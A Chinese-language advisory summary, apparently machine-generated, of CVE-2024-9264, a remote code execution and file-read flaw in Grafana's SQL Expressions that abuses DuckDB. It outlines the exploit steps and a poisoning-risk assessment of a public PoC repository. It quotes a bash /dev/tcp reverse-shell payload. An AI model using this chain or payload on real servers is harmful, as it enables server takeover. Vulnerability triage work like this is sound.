## CVE-2024-9264-Grafana-RCE

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) / 本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6; 11.1.0 <= version < 11.1.6, 11.1.7; 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，用户具有Viewer或更高权限，且DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL Expressions 功能中。攻击者可以通过构造恶意的 SQL 查询，利用 DuckDB 的 `shellfs` 扩展来执行任意代码或读取本地文件。该漏洞的利用需要满足以下条件：

1.  **启用SQL Expressions:** Grafana 的 SQL Expressions 必须处于启用状态。
2.  **Viewer或更高权限:** 攻击者需要拥有 Viewer 或更高的 Grafana 权限。
3.  **DuckDB存在:**  Grafana 服务器的 `$PATH` 环境变量中需要包含 `duckdb` 二进制文件。默认情况下，Grafana 发行版不包含此二进制文件，因此需要手动安装。

**漏洞利用方式：**

1.  **身份验证:** 使用有效的 Grafana 用户凭据进行身份验证。
2.  **写入反向Shell:** 使用 `writefile()` 函数将包含反向 shell 命令的脚本写入到 Grafana 服务器的文件系统中（例如 `/tmp/rev.sh`）。POC使用`bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1`。
3.  **执行反向Shell:** 通过 DuckDB 的 `read_csv()` 函数执行写入的文件，从而触发反向 shell 连接。
4.  **接收Shell:** 攻击者需要在攻击机上监听指定的端口，以接收反向 shell 连接。

**有效性评估：**

提供的 PoC 代码 (`fpoc.py`) 看起来是有效的，因为它修复了原始 PoC 中的 `write_file()` 函数的语法错误，并使用了正确的 shell payload，经验证可以在易受攻击的 Grafana 11.0.0 实例上成功执行反向 shell。`README.md`中也明确说明了该代码的修复和验证过程。

**投毒风险评估：**

该 PoC 仓库中存在投毒代码的可能性较低，估计在10%左右。原因如下：

1.  **代码清晰：** PoC 代码结构清晰，功能明确，没有发现明显的可疑代码。
2.  **修复声明：**  `README.md` 中明确声明了对原始 PoC 的修复，并解释了修复的原因和内容。
3.  **代码量少：**  整个仓库的代码量较少，隐藏恶意代码的难度较高。
4.  **作者信誉：** 作者 Exerr 在 `README.md` 中署名，并链接到其 GitHub 个人主页。虽然这不能完全保证作者的安全性，但增加了作者进行恶意行为的成本。

然而，仍然存在一些潜在的风险：

1.  **依赖风险：** PoC 代码依赖于 `requests` 库。虽然该库本身是安全的，但如果攻击者控制了 PyPI 仓库，可能会发布恶意版本的 `requests` 库，从而导致 PoC 代码被感染。
2.  **细微篡改：** 攻击者可能会对 PoC 代码进行细微的修改，例如修改反向 shell 的 IP 地址或端口，从而将 shell 连接到攻击者控制的服务器上。

总而言之，虽然该 PoC 仓库中存在投毒代码的可能性较低，但用户在使用时仍然需要保持警惕，仔细审查代码，并从可信的来源下载依赖库。

**项目地址:** [Exerrdev/CVE-2024-9264-Fixed](https://github.com/Exerrdev/CVE-2024-9264-Fixed)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)